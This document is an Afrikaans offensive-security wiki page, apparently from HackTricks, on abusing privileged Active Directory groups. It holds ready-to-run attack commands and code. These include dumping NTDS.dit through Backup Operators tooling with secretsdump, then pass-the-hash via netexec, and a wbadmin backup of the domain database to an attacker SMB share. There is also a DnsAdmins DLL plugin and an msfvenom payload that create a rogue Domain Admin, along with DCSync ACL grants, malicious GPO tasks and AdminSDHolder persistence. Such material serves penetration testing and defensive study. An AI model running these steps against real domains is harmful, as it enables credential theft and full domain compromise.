# Bevoorregte Groepe

{{#include ../../banners/hacktricks-training.md}}

## Goed-bekende groepe met administratiewe voorregte

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Hierdie groep het die mag om rekeninge en groepe te skep wat nie administrateurs op die domein is nie. Daarbenewens maak dit plaaslike aanmelding op die Domain Controller (DC) moontlik.

Om die lede van hierdie groep te identifiseer, word die volgende opdrag uitgevoer:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Die toevoeging van nuwe gebruikers is toegelaat, sowel as plaaslike aanmelding op die DC.

## AdminSDHolder groep

Die **AdminSDHolder**-groep se Access Control List (ACL) is kritiek, aangesien dit die toestemmings vir alle "protected groups" binne Active Directory bepaal, insluitend hoë-privilege groepe. Hierdie meganisme verseker die sekuriteit van hierdie groepe deur ongemagtigde wysigings te keer.

'n Aanvaller kan dit misbruik deur die **AdminSDHolder**-groep se ACL te wysig en 'n standaard gebruiker volle toestemmings te gee. Dit sou daardie gebruiker effektief volle beheer oor alle protected groups gee. Indien hierdie gebruiker se toestemmings verander of verwyder word, sal hulle weens die stelselontwerp binne 'n uur outomaties herstel word.

Onlangse Windows Server-dokumentasie beskou steeds verskeie ingeboude operator-groepe as **protected** objekte (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, ens.). Die **SDProp** proses hardloop standaard elke 60 minute op die **PDC Emulator**, stel `adminCount=1`, en skakel erfenis af op protected objekte. Dit is nuttig vir beide persistence en vir die jag van verouderde geprivilegieerde gebruikers wat uit 'n protected group verwyder is maar steeds die nie-erfende ACL behou.

Opdragte om die lede te hersien en toestemmings te wysig sluit in:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Daar is 'n script beskikbaar om die herstelproses te versnel: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Vir meer besonderhede, besoek [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Lidmaatskap van hierdie groep maak dit moontlik om verwyderde Active Directory-objekte te lees, wat sensitiewe inligting kan openbaar:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Dit is nuttig vir **herwinning van vorige bevoorregte paaie**. Verwyderde objekte kan steeds `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, ou SPNs, of die DN van 'n verwyderde bevoorregte groep openbaar maak, wat later deur 'n ander operateur herstel kan word.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Domain Controller Access

Toegang tot lêers op die DC is beperk tensy die gebruiker deel is van die `Server Operators`-groep, wat die vlak van toegang verander.

### Privilege Escalation

Deur `PsService` of `sc` van Sysinternals te gebruik, kan 'n mens diensregte inspekteer en wysig. Die `Server Operators`-groep het byvoorbeeld volle beheer oor sekere dienste, wat die uitvoering van ewekansige opdragte en privilege escalation toelaat:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Hierdie opdrag toon dat `Server Operators` volle toegang het, wat die manipulasie van dienste vir verhoogde voorregte moontlik maak.

## Backup Operators

Lidmaatskap van die `Backup Operators`-groep gee toegang tot die lêerstelsel van `DC01` weens die `SeBackup`- en `SeRestore`-voorregte. Hierdie voorregte maak dit moontlik om vouers te deursoek, lyste te maak en lêers te kopieer, selfs sonder eksplisiete toestemmings, deur die `FILE_FLAG_BACKUP_SEMANTICS` vlag te gebruik. Die gebruik van spesifieke skripte is nodig vir hierdie proses.

Om groepslede te lys, voer uit:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Plaaslike Aanval

Om hierdie bevoegdhede plaaslik te benut, word die volgende stappe gevolg:

1. Importeer die nodige biblioteke:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Skakel in en verifieer `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Kry toegang tot en kopieer lêers uit beperkte gidse, byvoorbeeld:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD-aanval

Direkte toegang tot die Domain Controller se lêerstelsel maak die diefstal van die `NTDS.dit` databasis moontlik, wat alle NTLM hashes vir domeingebruikers en -rekenaars bevat.

#### Gebruik diskshadow.exe

1. Skep 'n shadow copy van die `C` drive:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopieer `NTDS.dit` van die shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatiewelik gebruik `robocopy` vir die kopiëring van lêers:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Ekstraheer `SYSTEM` en `SAM` vir hash retrieval:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Haal alle hashes uit `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Na uittrekking: Pass-the-Hash na DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Gebruik wbadmin.exe

1. Stel 'n NTFS-lêerstelsel vir 'n SMB-server op die aanvallermasjien op en kas SMB-geloofsbriewe op die teikenmasjien.
2. Gebruik `wbadmin.exe` vir stelsel-rugsteun en `NTDS.dit`-onttrekking:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Vir 'n praktiese demonstrasie, sien [DEMO VIDEO MET IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Lede van die **DnsAdmins**-groep kan hul voorregte misbruik om 'n arbitrêre DLL met SYSTEM-voorregte op 'n DNS-server te laai, wat dikwels op Domain Controllers gehuisves is. Hierdie vermoë bied aansienlike eksploitasiepotensiaal.

Om lede van die DnsAdmins-groep te lys, gebruik:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Voer willekeurige DLL uit (CVE‑2021‑40469)

> [!NOTE]
> Hierdie kwesbaarheid laat die uitvoering van willekeurige kode toe met SYSTEM privileges in die DNS service (gewoonlik binne die DCs). Hierdie probleem is in 2021 reggestel.

Members kan die DNS server dwing om 'n willekeurige DLL te laai (hetsy lokaal of vanaf 'n remote share) deur opdragte soos:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Om die DNS-diens te herbegin (wat moontlik addisionele toestemmings vereis) is nodig sodat die DLL gelaai kan word:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Vir meer besonderhede oor hierdie aanvalvektor, verwys na ired.team.

#### Mimilib.dll

Dit is ook moontlik om mimilib.dll te gebruik vir command execution, deur dit te wysig sodat dit spesifieke opdragte of reverse shells uitvoer. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) vir meer inligting.

### WPAD Record for MitM

DnsAdmins kan DNS-records manipuleer om Man-in-the-Middle (MitM) aanvalle uit te voer deur 'n WPAD record te skep nadat die global query block list gedeaktiveer is. Tools soos Responder of Inveigh kan gebruik word vir spoofing en om netwerkverkeer vas te vang.

### Event Log Readers
Lede kan toegang tot event logs kry en moontlik sensitiewe inligting soos plaintext passwords of command execution details vind:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Hierdie groep kan DACLs op die domain object wysig, wat moontlik DCSync privileges kan verleen. Tegnieke vir privilege escalation wat hierdie groep uitbuit, word in die Exchange-AD-Privesc GitHub repo uiteengesit.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
As jy as 'n lid van hierdie groep kan optree, is die klassieke misbruik om aan 'n deur 'n aanvaller beheerde prinsipaal die repliseringsregte wat nodig is vir [DCSync](dcsync.md) toe te ken:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Histories het **PrivExchange** postbus-toegang, gedwonge Exchange-verifikasie, en LDAP relay gekoppel om tot dieselfde primitief te lei. Selfs waar daardie relay-pad gemitigateer is, bly direkte lidmaatskap van `Exchange Windows Permissions` of beheer van 'n Exchange-bediener 'n hoë-waarde roete na domein-repliseringsregte.

## Hyper-V Administrateurs

Hyper-V Administrateurs het volle toegang tot Hyper-V, wat uitgebuit kan word om beheer oor virtualiseerde domeinkontroleerders te verkry. Dit sluit in die kloon van lewende DC's en die onttrekking van NTLM hashes uit die NTDS.dit-lêer.

### Uitbuitingsvoorbeeld

Die praktiese misbruik is gewoonlik **offline-toegang tot DC disks/checkpoints** eerder as ou gasheervlak LPE-truuks. Met toegang tot die Hyper-V host kan 'n operateur 'n checkpoint maak of 'n virtualiseerde Domain Controller export, die VHDX mount en `NTDS.dit`, `SYSTEM`, en ander geheime onttrek sonder om LSASS binne die guest aan te raak:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Van daar af, hergebruik die `Backup Operators` workflow om `Windows\NTDS\ntds.dit` en die registry hives aflyn te kopieer.

## Group Policy Creators Owners

Hierdie groep laat lede toe om Group Policies in die domein te skep. Hulle lede kan egter nie group policies op gebruikers of groepe toepas of bestaande GPOs wysig nie.

Die belangrike nuans is dat die **skepper word eienaar van die nuwe GPO** en gewoonlik genoeg regte kry om dit daarna te wysig. Dit beteken hierdie groep is interessant wanneer jy óf:

- skep 'n kwaadwillige GPO en oortuig 'n admin om dit aan 'n teiken OU/domain te koppel
- wysig 'n GPO wat jy geskep het wat reeds elders nuttig gekoppel is
- misbruik 'n ander gedelegeerde reg wat jou toelaat om GPOs te koppel, terwyl hierdie groep jou die wysigkant gee

Praktiese misbruik beteken gewoonlik om 'n **Immediate Task**, **startup script**, **local admin membership**, of **user rights assignment** verandering by te voeg deur SYSVOL-backed policy files.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
As jy die GPO handmatig deur `SYSVOL` wysig, onthou die verandering alleen is nie genoeg nie: `versionNumber`, `GPT.ini`, en soms `gPCMachineExtensionNames` moet ook bygewerk word of kliënte sal die beleidverversing ignoreer.

## Organization Management

In omgewings waar **Microsoft Exchange** ontplooi is, het 'n spesiale groep bekend as **Organization Management** beduidende vermoëns. Hierdie groep het die bevoegdheid om **toegang tot die posbusse van alle domeingebruikers** te kry en behou **volle beheer oor die 'Microsoft Exchange Security Groups'** Organisatoriese Eenheid (OU). Hierdie beheer sluit die **`Exchange Windows Permissions`** groep in, wat vir privilege escalation misbruik kan word.

### Uitbuiting van bevoegdhede en opdragte

#### Print Operators

Lede van die **Print Operators** groep het verskeie bevoegdhede, insluitend die **`SeLoadDriverPrivilege`**, wat hulle toelaat om lokaal aan te meld op 'n Domain Controller, dit af te skakel, en drukkers te bestuur. Om hierdie bevoegdhede te misbruik, veral as **`SeLoadDriverPrivilege`** nie sigbaar is in 'n nie-geëlevateerde konteks nie, is dit nodig om User Account Control (UAC) te omseil.

Om die lede van hierdie groep te lys, word die volgende PowerShell-opdrag gebruik:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Op Domain Controllers is hierdie groep gevaarlik omdat die standaard Domain Controller Policy die **`SeLoadDriverPrivilege`** aan `Print Operators` toeken. As jy 'n verhoogde token vir 'n lid van hierdie groep kry, kan jy die privilege aktiveer en 'n gesigneerde-maar-kwesbare driver laai om na kernel/SYSTEM te spring. Vir besonderhede oor tokenhantering, kyk na [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Die lede van hierdie groep kry toegang tot rekenaars via Remote Desktop Protocol (RDP). Om hierdie lede te lys, is daar PowerShell-opdragte beskikbaar:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Verdere insigte oor die uitbuiting van RDP is in toegewyde pentesting-bronne te vind.

#### Remote Management Users

Lede kan via **Windows Remote Management (WinRM)** toegang tot rekenaars kry. Enumeration van hierdie lede word bereik deur:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Vir eksploitasie-metodes verwant aan **WinRM** moet spesifieke dokumentasie geraadpleeg word.

#### Server Operators

Hierdie groep het bevoegdhede om verskeie konfigurasies op Domain Controllers uit te voer, insluitend rugsteun- en herstelbevoegdhede, om stelseltyd te verander, en om die stelsel af te skakel. Om die lede te lys, is die opdrag wat verskaf word:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Op Domain Controllers erf `Server Operators` gewoonlik genoeg regte om **dienste te herkonfigureer of te begin/stop** en ontvang ook `SeBackupPrivilege`/`SeRestorePrivilege` deur die standaard DC-beleid. In die praktyk maak dit hulle 'n brug tussen **service-control abuse** en **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
As 'n service ACL aan hierdie groep verander-/begin-regte gee, wys die diens na 'n ewekansige kommando, begin dit as `LocalSystem`, en herstel dan die oorspronklike `binPath`. As service control gesluit is, val terug op die `Backup Operators`-tegnieke hierbo om `NTDS.dit` te kopieer.

## Verwysings <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
